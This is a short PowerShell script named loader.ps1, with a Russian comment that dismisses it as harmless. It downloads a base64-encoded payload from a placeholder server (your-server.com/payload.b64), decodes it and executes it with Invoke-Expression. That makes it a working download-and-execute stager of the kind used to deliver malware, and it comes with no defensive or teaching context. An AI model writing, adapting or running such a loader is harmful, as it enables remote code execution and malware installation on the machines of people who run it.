# loader.ps1 — ЕГО НЕ ЖАЛКО, ОН НИЧЕГО НЕ УМЕЕТ
$e = (New-Object Net.WebClient).DownloadString('https://your-server.com/payload.b64');
$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e));
Invoke-Expression $d